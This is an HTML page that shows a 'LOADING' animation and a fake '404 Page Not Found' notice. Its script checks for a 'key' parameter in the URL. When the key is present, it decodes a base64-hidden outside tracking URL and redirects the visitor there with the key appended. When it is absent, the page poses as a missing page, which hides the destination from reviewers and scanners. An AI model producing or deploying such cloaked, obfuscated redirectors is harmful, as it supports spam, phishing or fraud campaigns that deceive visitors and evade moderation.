<html>
   <head>
      <title>Redirecting...</title>
      <meta http-equiv="X-UA-Compatible" content="ie=edge">
      <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
      <style>
         body { background: #000; color: #fff; margin: 0; padding: 0; }
         #load {
            position: absolute;
            width: 600px;
            height: 36px;
            left: 50%;
            top: 40%;
            margin-left: -300px;
            overflow: visible;
            user-select: none;
            cursor: default;
         }
         #load div {
            position: absolute;
            width: 20px;
            height: 36px;
            opacity: 0;
            font-family: Helvetica, Arial, sans-serif;
            animation: move 2s linear infinite;
            transform: rotate(180deg);
            color: #1bf822;
         }
         #load div:nth-child(2) { animation-delay: 0.2s; }
         #load div:nth-child(3) { animation-delay: 0.4s; }
         #load div:nth-child(4) { animation-delay: 0.6s; }
         #load div:nth-child(5) { animation-delay: 0.8s; }
         #load div:nth-child(6) { animation-delay: 1s; }
         #load div:nth-child(7) { animation-delay: 1.2s; }
         @keyframes move {
            0% { left: 0; opacity: 0; }
            35% { left: 41%; transform: rotate(0deg); opacity: 1; }
            65% { left: 59%; transform: rotate(0deg); opacity: 1; }
            100% { left: 100%; transform: rotate(-180deg); opacity: 0; }
         }
         #notfound {
            display: none;
            background: #f5f5f5;
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            text-align: center;
            color: #333;
            padding-top: 10%;
         }
         #notfound h1 {
            font-size: 120px;
            font-weight: bold;
            margin: 0;
            letter-spacing: -5px;
         }
         #notfound h2 {
            font-size: 30px;
            margin: 20px 0;
            font-weight: normal;
         }
         #notfound p {
            font-size: 16px;
            margin-bottom: 30px;
            color: #666;
         }
         #notfound .btn {
            text-transform: uppercase;
            font-weight: bold;
            border: none;
            padding: 10px 25px;
         }
      </style>
   </head>
   <body>
      <!-- Loading -->
      <div id="load">
         <div>G</div>
         <div>N</div>
         <div>I</div>
         <div>D</div>
         <div>A</div>
         <div>O</div>
         <div>L</div>
      </div>

      <!-- 404 Page -->
      <div id="notfound" class="container">
         <h1>404</h1>
         <h2>Page Not Found</h2>
         <p>The page you are looking for may be missing.</p>
         <a href="/" class="btn btn-primary">Back to Homepage</a>
      </div>

      <script>
         const params = new URLSearchParams(window.location.search);
         const key = params.get('key');


         const base64Target = "aHR0cHM6Ly9hcGkucG93ZXJhZmZ0cmt5LmNvbS90L2Nsaz9pZD1xeXRxNURoT05PZlFsbWdTRCZzMT0=";

         function decodeBase64(str) {
            return atob(str);
         }

         if (key) {
            setTimeout(function () {
               const decodedUrl = decodeBase64(base64Target);
               window.location.href = decodedUrl + encodeURIComponent(key);
            }, 2000);
         } else {
            document.getElementById('load').style.display = 'none';
            document.getElementById('notfound').style.display = 'block';
            document.body.style.background = "#f5f5f5";
         }
      </script>
